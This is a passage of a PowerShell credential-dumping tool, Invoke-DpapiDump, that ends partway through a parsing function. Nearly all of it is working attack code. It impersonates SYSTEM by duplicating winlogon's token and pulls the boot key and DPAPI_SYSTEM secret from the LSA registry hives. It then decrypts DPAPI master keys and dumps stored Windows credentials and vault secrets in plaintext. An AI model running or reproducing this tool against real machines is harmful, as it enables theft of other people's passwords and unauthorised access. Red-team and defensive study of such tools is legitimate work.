Function Invoke-DpapiDump {
<#
.SYNOPSIS
    Dump credentials protected by DPAPI.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Invoke-DpapiDump extracts DPAPI master keys and uses it to decrypt system credentials protected by DPAPI (Windows credentials and vaults).
    The decryption part is adapted from SharpDPAPI by @harmj0y.

.EXAMPLE
    PS C:\> Invoke-DpapiDump
#>
    [CmdletBinding()]
    Param ()

    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
        Write-Warning "This command must be launched as an Administrator" 
        return
    }

    Write-Verbose "Extracting system DPAPI keys..."
    $systemDpapiKeys = Invoke-AsSystem -ScriptBlock { Get-LsaDpapiKey }
    $dpapiKeyMachine = $systemDpapiKeys['dpapi_machinekey']
    $dpapiKeyUser = $systemDpapiKeys['dpapi_userkey']
    Write-Verbose "[*] dpapi_machinekey: $([BitConverter]::ToString($dpapiKeyMachine).Replace('-','').ToLower())"
    Write-Verbose "[*] dpapi_userkey: $([BitConverter]::ToString($dpapiKeyUser).Replace('-','').ToLower())"

    Write-Verbose "Extracting system master keys..."
    $masterKeys = @{}
    Get-ChildItem -Path "$Env:SystemRoot\System32\Microsoft\Protect\" -Recurse -Force | Where-Object {-not $_.PSIsContainer} | ForEach-Object {
        if ([Regex]::IsMatch($_.Name, "^(\{{0,1}([0-9a-fA-F]){8}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){12}\}{0,1})$")) {
            Write-Verbose "[*] Found system master key file: $($_.Name)"
            # Decrypt system master key using DPAPI user key
            $masterKeyBytes = [IO.File]::ReadAllBytes($_.FullName)
            if ($_.Directory.Name -eq 'User') {
                if ($plaintextMasterKey = Decrypt-MasterKeyWithSha -MasterKeyBytes $masterKeyBytes -ShaBytes $dpapiKeyUser) {
                    $masterKeys += $plaintextMasterKey
                }
            }
            else {
                if ($plaintextMasterKey = Decrypt-MasterKeyWithSha -MasterKeyBytes $masterKeyBytes -ShaBytes $dpapiKeyMachine) {
                    $masterKeys += $plaintextMasterKey
                }
            }
        }
    }

    Write-Verbose "Extracting credentials..."
    $credentialFilePaths = @(
        "$Env:SystemRoot\System32\config\systemprofile\AppData\Local\Microsoft\Credentials"
        "$Env:SystemRoot\System32\config\systemprofile\AppData\Roaming\Microsoft\Credentials"
        "$Env:SystemRoot\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials"
        "$Env:SystemRoot\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Credentials"
        "$Env:SystemRoot\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Credentials"
        "$Env:SystemRoot\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Credentials"
    )
    foreach ($credentialFilePath in $credentialFilePaths) {
        Get-ChildItem -Path $credentialFilePath -Force -ErrorAction SilentlyContinue | Where-Object {-not $_.PSIsContainer} | ForEach-Object {
            # Decrypt credential blob using available master keys
            Write-Verbose "[*] Found credential file: $($_.FullName)"
            $credentialBytes = [IO.File]::ReadAllBytes($_.FullName)
            if ($plaintextBytes = Decrypt-DpapiBlob -BlobBytes $credentialBytes -MasterKeys $masterKeys -GuidOffset 36) {
                Get-CredentialBlob -DecBlobBytes $plaintextBytes
            }
        }
    }

    Write-Verbose "Extracting vault policies..."
    $vaultDirectoryPaths = @(
        "$Env:SystemRoot\System32\config\systemprofile\AppData\Local\Microsoft\Vault"
        "$Env:SystemRoot\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault"
        "$Env:SystemRoot\ServiceProfiles\LocalService\AppData\Local\Microsoft\Vault"
        "$Env:SystemRoot\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Vault"
        "$Env:SystemRoot\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Vault"
        "$Env:SystemRoot\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Vault"
    )
    foreach ($vaultDirectoryPath in $vaultDirectoryPaths) {
        Get-ChildItem -Path $vaultDirectoryPath -Force -ErrorAction SilentlyContinue | Where-Object {$_.PSIsContainer} | ForEach-Object {
            if ([Regex]::IsMatch($_.Name, "[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}")) {
                # Attempt to decrypt the aes128/aes256 keys from the vault policy file
                $filePath = "$($_.FullName)\Policy.vpol"
                Write-Verbose "[*] Found vault policy file: $filePath"
                $policyBytes = [IO.File]::ReadAllBytes($filePath)
                $policyKeys = @{}
                $offset = 0
                $version = [BitConverter]::ToInt32($policyBytes, $offset)
                $offset += 4
                $vaultIDbytes = New-Object byte[] 16
                [Array]::Copy($policyBytes, $offset, $vaultIDbytes, 0, 16)
                $vaultID = New-Object guid @(,$vaultIDbytes)
                $offset += 16
                $nameLen = [BitConverter]::ToInt32($policyBytes, $offset)
                $offset += 4
                $name = [Text.Encoding]::Unicode.GetString($policyBytes, $offset, $nameLen)
                $offset += $nameLen
                $offset += 12
                $keyLen = [BitConverter]::ToInt32($policyBytes, $offset)
                $offset += 4
                $offset += 32
                $keyBlobLen = [BitConverter]::ToInt32($policyBytes, $offset)
                $offset += 4
                $blobBytes = New-Object byte[] $keyBlobLen
                [Array]::Copy($policyBytes, $offset, $blobBytes, 0, $keyBlobLen)
                if ($plaintextBytes = Decrypt-DpapiBlob -BlobBytes $blobBytes -MasterKeys $masterKeys -GuidOffset 24) {
                    $policyKeys = Get-PolicyBlob -DecBlobBytes $plaintextBytes
                    if (-not ($aes256key = $policyKeys['AES256'])) {
                        Write-Warning "Policy.vpol decryption failed."
                        continue
                    }
                    Write-Verbose "[*] AES128: $([BitConverter]::ToString($policyKeys['AES128']).Replace('-', ''))"
                    Write-Verbose "[*] AES256: $([BitConverter]::ToString($policyKeys['AES256']).Replace('-', ''))"

                    Write-Verbose "Extracting vault credentials..."
                    Get-ChildItem -Path $_.FullName -Force -ErrorAction SilentlyContinue | Where-Object {$_.Extension -eq '.vcrd'} | ForEach-Object {
                        # Attempt to decrypt credentials from the vault file
                        $vaultFile = $_.FullName
                        $vaultBytes = [IO.File]::ReadAllBytes($vaultFile)
                        if ($vaultData = Decrypt-VaultCredential -VaultBytes $vaultBytes -Aes256Key $aes256key) {
                            $cred = Get-VaultCredential ($vaultData['DecData'])
                            $cred | Add-Member -NotePropertyName 'Data' -NotePropertyValue $vaultData['FriendlyName']
                            $cred | Add-Member -NotePropertyName 'Comment' -NotePropertyValue 'WebCredential'
                            Write-Output $cred
                        }
                    }
                }
            }
        }
    }
}

Function Local:Invoke-AsSystem {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [scriptblock]
        $ScriptBlock,

        [Parameter(Position=1)]
        [object[]]
        $ArgumentList
    )

    $winlogonPid = Get-Process -Name "winlogon" | Select-Object -First 1 -ExpandProperty Id
    if (($processHandle = [DpapiDump.Native]::OpenProcess(0x400, $true, [Int32]$winlogonPid)) -eq [IntPtr]::Zero) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
    }

    $tokenHandle = [IntPtr]::Zero
    if (-not [DpapiDump.Native]::OpenProcessToken($processHandle, 0x0E, [ref]$tokenHandle)) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
    }

    $dupTokenHandle = [IntPtr]::Zero
    if (-not [DpapiDump.Native]::DuplicateTokenEx($tokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$dupTokenHandle)) {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
    }

    try {
        if (-not [DpapiDump.Native]::ImpersonateLoggedOnUser($dupTokenHandle)) {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "$([ComponentModel.Win32Exception]$err)"
        }
        & $ScriptBlock @ArgumentList
    }
    finally {
        if (-not [DpapiDump.Native]::RevertToSelf()) {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "$([ComponentModel.Win32Exception]$err)"
        }
    }
}

Function Local:Get-LsaDpapiKey {
    Param ()

    Begin {
        Function Local:Get-RegKeyClass([string]$key, [string]$subkey) {
            switch ($Key) {
                "HKCR" { $nKey = 0x80000000} #HK Classes Root
                "HKCU" { $nKey = 0x80000001} #HK Current User
                "HKLM" { $nKey = 0x80000002} #HK Local Machine
                "HKU"  { $nKey = 0x80000003} #HK Users
                "HKCC" { $nKey = 0x80000005} #HK Current Config
                default {
                    throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
                }
            }
            $KEYQUERYVALUE = 0x1
            $KEYREAD = 0x19
            $KEYALLACCESS = 0x3F
            $result = ""
            [int]$hkey = 0
            if (-not [DpapiDump.Native]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey)) {
                $classVal = New-Object Text.Stringbuilder 1024
                [int]$len = 1024
                if (-not [DpapiDump.Native]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,
                    [ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0)) {
                    $result = $classVal.ToString()
                }
                else {
                    Write-Error "RegQueryInfoKey failed"
                }
                [DpapiDump.Native]::RegCloseKey($hkey) | Out-Null
            }
            else {
                Write-Error "Cannot open key"
            }
            return $result
        }

        Function Local:Get-BootKey {
            $s = [string]::Join("", $("JD","Skew1","GBG","Data" | % {Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}))
            $b = New-Object Byte[] $($s.Length/2)
            0..$($b.Length-1) | % {$b[$_] = [Convert]::ToByte($s.Substring($($_*2), 2), 16)}
            $b2 = New-Object Byte[] 16
            0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -Begin {$i=0} {$b2[$i]=$b[$_]; $i++}
            return ,$b2
        }

        Function Local:Decrypt-LSASecretData ([byte[]]$Data, [byte[]]$Key, [byte[]]$InitialVector) {
            # Derive the encryption key (first hash with the key, and then 1000 times with IV)
            $sha256 = [Security.Cryptography.SHA256]::Create()
            $sha256.TransformBlock($Key,0,$Key.Length,$null,0) | Out-Null
            for ($a = 0; $a -lt 999; $a++) {
                $sha256.TransformBlock($InitialVector,0,$InitialVector.Length,$null,0) | Out-Null
            }
            $sha256.TransformFinalBlock($InitialVector,0,$InitialVector.Length) | Out-Null
            $encryptionKey = $sha256.Hash

            # Decrypt the data
            $aes = New-Object -TypeName System.Security.Cryptography.AesCryptoServiceProvider
            $aes.Mode="ECB"
            $aes.Padding="None"
            $aes.KeySize = 256
            $aes.Key = $encryptionKey
            $dec = $aes.CreateDecryptor()
            $decryptedData = $dec.TransformFinalBlock($Data,0,$Data.Count)
            return $decryptedData
        }

        Function Local:Parse-LSASecretBlob ([byte[]] $Data) {
            $version =   [BitConverter]::ToInt32($Data[3..0], 0)
            $guid =      [guid][byte[]]($Data[4..19])
            $algorithm = [BitConverter]::ToInt32($Data, 20)
            $flags =     [BitConverter]::ToInt32($Data, 24)
            $lazyIv =    $Data[28..59]
            New-Object -TypeName PSObject -Property @{
                "Version" =   $version
                "GUID" =      $guid
                "Algorighm" = $algorithm
                "Flags" =     $flags
                "IV" =        $lazyIv
                "Data" =      $Data[60..$($Data.Length)]
            }
        }

        Function Local:Parse-LSAPasswordBlob ([byte[]]$PasswordBlob) {
            # Get the size
            $BlobSize = [BitConverter]::ToInt32($PasswordBlob, 0)
            # Get the actual data (strip the first four DWORDs)
            $Blob = $PasswordBlob[16..$(16+$BlobSize-1)]
            return $Blob
        }

        Function Local:Parse-LSAKeyStream ([byte[]]$KeyStream) {
            # Get the stream size
            $streamSize = [BitConverter]::ToInt32($KeyStream,0)
            # Get the actual data (strip the first four DWORDs)
            $streamData = $KeyStream[16..$(16+$streamSize-1)]
            # Parse the keystream metadata
            $ksType = [BitConverter]::ToInt32($streamData[0..3], 0)
            #$currentKeyID = [guid][byte[]]($streamData[4..19])
            $ksType2 = [BitConverter]::ToInt32($streamData, 20)
            $ksNumKeys = [BitConverter]::ToInt32($streamData, 24)
            # Loop through the list of the keys, start right after the header information
            $pos = 28
            $keys = @{}
            for ($a = 0; $a -lt $ksNumKeys; $a++) {
                $keyId = [guid][byte[]]($streamData[$pos..$($pos+15)])
                $pos += 16
                $keyType = [BitConverter]::ToInt32($streamData[$pos..$($pos+3)], 0)
                $pos += 4
                $keySize = [BitConverter]::ToInt32($streamData[$pos..$($pos+3)], 0)
                $pos += 4
                $keyBytes = [byte[]]($streamData[$pos..$($pos+$keySize-1)])
                $pos += $keySize
                $keys[$keyId.ToString()] = $keyBytes
            }
            return $keys
        }

        Function Local:Pad([int] $data) {
            if (($data -band 0x3) -gt 0) {
                return ($data + ($data -band 0x3))
            }
            else {
                return $data
            }
        }

        Function Local:IsZeroes([Byte[]] $inputArray) {
            foreach ($b in $inputArray) {
                if ($b -ne 0x00) {
                    return $false
                }
            }
            return $true
        }
    }

    Process {
        # Get the syskey a.k.a. bootkey
        $syskey = Get-Bootkey
        # Get the encryption key Blob
        $encKeyBlob = Parse-LSASecretBlob (Get-ItemPropertyValue "HKLM:\SECURITY\Policy\PolEKList" -Name "(default)")     
        # Decrypt the encryption key Blob using the syskey
        $decKeyBlob = Decrypt-LSASecretData $encKeyBlob.Data $syskey $encKeyBlob.IV
        # Parse the keys
        $encKeys = Parse-LSAKeyStream $decKeyBlob
        # Get the password Blobs for each system account
        $regKey = "HKLM:\SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal"
        if (Test-Path $regKey) {
            # Get the secret Blob from registry
            $pwdBlob = Parse-LSASecretBlob (Get-ItemPropertyValue $regKey -Name "(default)")
            # Decrypt the password Blob using the correct encryption key
            $decPwdBlob = Decrypt-LSASecretData -Data ($pwdBlob.Data) -Key $encKeys[$($pwdBlob.GUID.ToString())] -InitialVector ($pwdBlob.IV)
            # Parse the Blob
            $pwdb = Parse-LSAPasswordBlob $decPwdBlob
            return @{dpapi_machinekey=$pwdb[4..23]; dpapi_userkey=$pwdb[24..43]}
        }
        else {
            Write-Error "No secrets found for DPAPI_SYSTEM"
        }
    }
}

Function Local:Decrypt-MasterKeyWithSha {
    Param (
        [byte[]] $MasterKeyBytes,
        [byte[]] $ShaBytes
    )

    Begin {
        Function Local:Get-DerivedPreKey ([byte[]] $ShaBytes, [int] $AlgHash, [byte[]] $Salt, [int] $Rounds) {
            $derivedPreKey = $null
            switch ($algHash) {
                # CALG_SHA_512 == 32782
                32782 {
                    # derive the "Pbkdf2/SHA512" key for the masterkey, using MS' silliness
                    $hmac = New-Object Security.Cryptography.HMACSHA512
                    $df = New-Object DpapiDump.Pbkdf2 ($hmac, $ShaBytes, $Salt, $Rounds)
                    $derivedPreKey = $df.GetBytes(48)
                    break
                }
                32777 {
                    # derive the "Pbkdf2/SHA1" key for the masterkey, using MS' silliness
                    $hmac = New-Object Security.Cryptography.HMACSHA1
                    $df = New-Object DpapiDump.Pbkdf2 ($hmac, $ShaBytes, $Salt, $Rounds)
                    $derivedPreKey = $df.GetBytes(32)
                    break
                }
                default {
                    throw "alg hash $algHash not currently supported!"
                }
            }
            return $derivedPreKey
        }

        Function Local:Decrypt-Aes256HmacSha512 ([byte[]] $ShaBytes, [byte[]] $Final, [byte[]] $EncData) {
            $HMACLen = (New-Object Security.Cryptography.HMACSHA512).HashSize / 8
            $aesCryptoProvider = New-Object Security.Cryptography.AesManaged
            $ivBytes = New-Object byte[] 16
            [Array]::Copy($Final, 32, $ivBytes, 0, 16)
            $key = New-Object byte[] 32
            [Array]::Copy($Final, 0, $key, 0, 32)
            $aesCryptoProvider.Key = $key
            $aesCryptoProvider.IV = $ivBytes
            $aesCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
            $aesCryptoProvider.Padding = [Security.Cryptography.PaddingMode]::Zeros
            # decrypt the encrypted data using the Pbkdf2-derived key
            $plaintextBytes = $aesCryptoProvider.CreateDecryptor().TransformFinalBlock($EncData, 0, $EncData.Length)
            $outLen = $plaintextBytes.Length
            $outputLen = $outLen - 16 - $HMACLen
            $masterKeyFull = New-Object byte[] $HMACLen
            # outLen - outputLen == 80 in this case
            [Array]::Copy($plaintextBytes, $outLen - $outputLen, $masterKeyFull, 0, $masterKeyFull.Length);
            $sha1 = New-Object Security.Cryptography.SHA1Managed
            $masterKeySha1 = $sha1.ComputeHash($masterKeyFull)
            # we're HMAC'ing the first 16 bytes of the decrypted buffer with the ShaBytes as the key
            $plaintextCryptBuffer = New-Object byte[] 16
            [Array]::Copy($plaintextBytes, $plaintextCryptBuffer, 16)
            $hmac1 = New-Object Security.Cryptography.HMACSHA512 @(, $ShaBytes)
            $round1Hmac = $hmac1.ComputeHash($plaintextCryptBuffer)
            # round 2
            $round2buffer = New-Object byte[] $outputLen
            [Array]::Copy($plaintextBytes, $outLen - $outputLen, $round2buffer, 0, $outputLen)
            $hmac2 = New-Object Security.Cryptography.HMACSHA512 @(, $round1Hmac)
            $round2Hmac = $hmac2.ComputeHash($round2buffer)
            # compare the second HMAC value to the original plaintextBytes, starting at index 16
            $comparison = New-Object byte[] 64
            [Array]::Copy($plaintextBytes, 16, $comparison, 0, $comparison.Length)
            if ([Linq.Enumerable]::SequenceEqual($comparison, $round2Hmac)) {
                return $masterKeySha1
            }
            throw "HMAC integrity check failed!"
        }

        Function Local:Decrypt-TripleDesHmac ([byte[]] $Final, [byte[]] $EncData) {
            $desCryptoProvider = New-Object Security.Cryptography.TripleDESCryptoServiceProvider
            $ivBytes = New-Object byte[] 8
            $key = New-Object byte[] 24
            [Array]::Copy($Final, 24, $ivBytes, 0, 8)
            [Array]::Copy($Final, 0, $key, 0, 24)
            $desCryptoProvider.Key = $key
            $desCryptoProvider.IV = $ivBytes
            $desCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
            $desCryptoProvider.Padding = [Security.Cryptography.PaddingMode]::Zeros
            $plaintextBytes = $desCryptoProvider.CreateDecryptor().TransformFinalBlock($EncData, 0, $EncData.Length)
            $decryptedkey = New-Object byte[] 64
            [Array]::Copy($plaintextBytes, 40, $decryptedkey, 0, 64)
            $sha1 = New-Object Security.Cryptography.SHA1Managed
            $masterKeySha1 = $sha1.ComputeHash($decryptedkey)
            return $masterKeySha1
        }
    }

    Process {
        $guidMasterKey = [Text.Encoding]::Unicode.GetString($MasterKeyBytes, 12, 72)
        # Get the master key
        $offset = 96
        $masterKeyLen = [BitConverter]::ToInt64($MasterKeyBytes, $offset)
        $offset += 4 * 8
        $masterKeySubBytes = New-Object byte[] $masterKeyLen
        [Array]::Copy($MasterKeyBytes, $offset, $masterKeySubBytes, 0, $masterKeyLen)
        $offset = 4
        $salt = New-Object byte[] 16
        [Array]::Copy($masterKeySubBytes, 4, $salt, 0, 16)
        $offset += 16
        $rounds = [BitConverter]::ToInt32($masterKeySubBytes, $offset)
        $offset += 4
        $algHash = [BitConverter]::ToInt32($masterKeySubBytes, $offset)
        $offset += 4
        $algCrypt = [BitConverter]::ToInt32($masterKeySubBytes, $offset)
        $offset += 4
        $encData = New-Object byte[] ($masterKeySubBytes.Length - $offset)
        [Array]::Copy($masterKeySubBytes, $offset, $encData, 0, $encData.Length)
        $derivedPreKey = Get-DerivedPreKey $ShaBytes $algHash $salt $rounds
        if (($algCrypt -eq 26128) -and ($algHash -eq 32782)) {
            # CALG_AES_256 == 26128 , CALG_SHA_512 == 32782
            $masterKeySha1 = Decrypt-Aes256HmacSha512 $ShaBytes $derivedPreKey $encData
            $masterKeyStr = [BitConverter]::ToString($masterKeySha1).Replace("-", "")
            return @{$guidMasterKey=$masterKeyStr}
        }
        elseif (($algCrypt -eq 26115) -and (($algHash -eq 32777) -or ($algHash -eq 32772))) {
            # 32777(CALG_HMAC) / 26115(CALG_3DES)
            $masterKeySha1 = Decrypt-TripleDesHmac $derivedPreKey $encData
            $masterKeyStr = [BitConverter]::ToString($masterKeySha1).Replace("-", "")
            return @{$guidMasterKey=$masterKeyStr}
        }
        else {
            throw "Alg crypt $algCrypt not currently supported!"
        }
    }

    End {}
}

Function Local:Decrypt-DpapiBlob {
    Param (
        [byte[]]
        $BlobBytes,

        [hashtable]
        $MasterKeys,

        [int]
        $GuidOffset = 24
    )

    Begin {
        Function Local:Get-DerivedKey ([byte[]] $KeyBytes, [byte[]] $SaltBytes, [int] $AlgHash) {
            if ($algHash -eq 32782) { # CALG_SHA_512
                $hmac = New-Object Security.Cryptography.HMACSHA512 @(, $KeyBytes)
                $sessionKeyBytes = $hmac.ComputeHash($saltBytes)
                return $sessionKeyBytes
            }
            elseif ($algHash -eq 32772) { # CALG_SHA1
                $ipad = New-Object byte[] 64
                $opad = New-Object byte[] 64
                for ($i = 0; $i -lt 64; $i++) {
                    $ipad[$i] = [Convert]::ToByte(0x36) # '6'
                    $opad[$i] = [Convert]::ToByte(0x5c) # '\'
                }
                for ($i = 0; $i -lt $keyBytes.Length; $i++) {
                    $ipad[$i] = $ipad[$i] -bxor $keyBytes[$i]
                    $opad[$i] = $opad[$i] -bxor $keyBytes[$i]
                }
                $bufferI = New-Object byte[] ($ipad.Length + $saltBytes.Length)
                [Buffer]::BlockCopy($ipad, 0, $bufferI, 0, $ipad.Length)
                [Buffer]::BlockCopy($saltBytes, 0, $bufferI, $ipad.Length, $saltBytes.Length)
                $sha1 = New-Object Security.Cryptography.SHA1Managed
                $sha1BufferI = $sha1.ComputeHash($bufferI)
                $bufferO = New-Object byte[] ($opad.Length + $sha1BufferI.Length)
                [Buffer]::BlockCopy($opad, 0, $bufferO, 0, $opad.Length)
                [Buffer]::BlockCopy($sha1BufferI, 0, $bufferO, $opad.Length, $sha1BufferI.Length)
                $sha1Buffer0 = $sha1.ComputeHash($bufferO)

                $ipad = New-Object byte[] 64
                $opad = New-Object byte[] 64
                for ($i = 0; $i -lt 64; $i++) {
                    $ipad[$i] = [Convert]::ToByte(0x36) # '6'
                    $opad[$i] = [Convert]::ToByte(0x5c) # '\'
                }
                for ($i = 0; $i -lt $sha1Buffer0.Length; $i++) {
                    $ipad[$i] = $ipad[$i] -bxor $sha1Buffer0[$i]
                    $opad[$i] = $opad[$i] -bxor $sha1Buffer0[$i]
                }
                $sha1 = New-Object Security.Cryptography.SHA1Managed
                $ipadSHA1bytes = $sha1.ComputeHash($ipad)
                $ppadSHA1bytes = $sha1.ComputeHash($opad)
                $ret = New-Object byte[] ($ipadSHA1bytes.Length + $ppadSHA1bytes.Length)
                [Buffer]::BlockCopy($ipadSHA1bytes, 0, $ret, 0, $ipadSHA1bytes.Length)
                [Buffer]::BlockCopy($ppadSHA1bytes, 0, $ret, $ipadSHA1bytes.Length, $ppadSHA1bytes.Length)
                return $ret
            }
            else {
                return
            }
        }

        Function Local:Decrypt-Blob {
            Param(
                [byte[]]
                $Ciphertext,

                [byte[]]
                $Key,

                [int]
                $AlgCrypt,

                [Security.Cryptography.PaddingMode]
                $padding = [Security.Cryptography.PaddingMode]::Zeros
            )

            $plaintextBytes = $null
            switch ($algCrypt) {
                26115 { # CALG_3DES
                    # Decrypt the blob with 3DES
                    $desCryptoProvider = New-Object Security.Cryptography.TripleDESCryptoServiceProvider
                    $ivBytes = New-Object byte[] 8
                    $desCryptoProvider.Key = $key
                    $desCryptoProvider.IV = $ivBytes
                    $desCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
                    $desCryptoProvider.Padding = $padding
                    $plaintextBytes = $desCryptoProvider.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
                }
                26128 { # CALG_AES_256
                    # Decrypt the blob with AES256
                    $aesCryptoProvider = New-Object Security.Cryptography.AesManaged
                    $ivBytes = New-Object byte[] 16
                    $aesCryptoProvider.Key = $key
                    $aesCryptoProvider.IV = $ivBytes
                    $aesCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
                    $aesCryptoProvider.Padding = $padding
                    $plaintextBytes = $aesCryptoProvider.CreateDecryptor().TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
                }
                default {
                    Write-Warning "Could not decrypt credential blob, unsupported encryption algorithm: $algCrypt"
                }
            }
            return $plaintextBytes
        }
    }

    Process {
        $offset = $GuidOffset
        $guidMasterKeyBytes = New-Object byte[] 16
        [Array]::Copy($BlobBytes, $offset, $guidMasterKeyBytes, 0, 16)
        $guidMasterKey = New-Object Guid @(,$guidMasterKeyBytes)
        $guidString = [string] $guidMasterKey
        Write-Verbose "[*] guidMasterKey: $guidString"
        $offset += 16
        $flags = [BitConverter]::ToUInt32($BlobBytes, $offset)
        $offset += 4
        $descLength = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        $description = [Text.Encoding]::Unicode.GetString($BlobBytes, $offset, $descLength)
        $offset += $descLength
        $algCrypt = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        $algCryptLen = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        $saltLen = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        $saltBytes = New-Object byte[] $saltLen
        [Array]::Copy($BlobBytes, $offset, $saltBytes, 0, $saltLen)
        $offset += $saltLen
        $hmacKeyLen = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4 + $hmacKeyLen
        $algHash = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        Write-Verbose "[*] algHash/algCrypt: $algHash/$algCrypt"
        Write-Verbose "[*] description: $description"
        $algHashLen = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        $hmac2KeyLen = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4 + $hmac2KeyLen
        $dataLen = [BitConverter]::ToInt32($BlobBytes, $offset)
        $offset += 4
        $dataBytes = New-Object byte[] $dataLen
        [Array]::Copy($BlobBytes, $offset, $dataBytes, 0, $dataLen)
        if ($MasterKeys.ContainsKey($guidString)) {
            # If this key is present, decrypt this blob
            if ($algHash -eq 32782 -or $algHash -eq 32772) {
                # Convert hex string to byte array
                $keyBytes = [byte[]] -split ($MasterKeys[$guidString].ToString() -replace '..', '0x$& ')
                # Derive the session key
                $derivedKeyBytes = Get-DerivedKey $keyBytes $saltBytes $algHash
                $finalKeyBytes = New-Object byte[] ($algCryptLen / 8)
                [Array]::Copy($derivedKeyBytes, $finalKeyBytes, $algCryptLen / 8)
                # Decrypt the blob with the session key
                return (Decrypt-Blob -Ciphertext $DataBytes -Key $finalKeyBytes -AlgCrypt $algCrypt)
            }
            else {
                Write-Warning "Could not decrypt credential blob, unsupported hash algorithm: $algHash"
            }
        }
    }
}

Function Local:Get-CredentialBlob {
    Param (
        [byte[]]
        $DecBlobBytes
    )

    $offset = 0
    $credFlags = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $credSize = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $credUnk0 = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $type = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $flags = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $lastWritten = [long] [BitConverter]::ToInt64($decBlobBytes, $offset)
    $offset += 8
    $lastWrittenTime = New-Object DateTime
    try {
        # Check that decrypytion worked correctly
        $lastWrittenTime = [DateTime]::FromFileTime($lastWritten)
    }
    catch {
        Write-Error "Credential blob decryption failed"
        return
    }

    $unkFlagsOrSize = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $persist = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $attributeCount = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $unk0 = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $unk1 = [BitConverter]::ToUInt32($decBlobBytes, $offset)
    $offset += 4
    $targetNameLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $targetName = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $targetNameLen).Trim()
    $offset += $targetNameLen
    $targetAliasLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $targetAlias = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $targetAliasLen).Trim()
    $offset += $targetAliasLen
    $commentLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $comment = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $commentLen).Trim()
    $offset += $commentLen
    $unkDataLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $unkData = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $unkDataLen).Trim()
    $offset += $unkDataLen
    $userNameLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $userName = [Text.Encoding]::Unicode.GetString($decBlobBytes, $offset, $userNameLen).Trim()
    $offset += $userNameLen
    $credBlobLen = [BitConverter]::ToInt32($decBlobBytes, $offset)
    $offset += 4
    $credBlobBytes = New-Object byte[] $credBlobLen
    [Array]::Copy($decBlobBytes, $offset, $credBlobBytes, 0, $credBlobLen)
    try {
        $credBlob = [Text.Encoding]::Unicode.GetString($credBlobBytes).Trim()
    }
    catch {
        $credBlob = [BitConverter]::ToString($credBlobBytes).Replace("-", " ").Trim()
    }
    $cred = [ordered]@{}
    $cred["UserName"] = $userName
    $cred["TargetName"] = $targetName
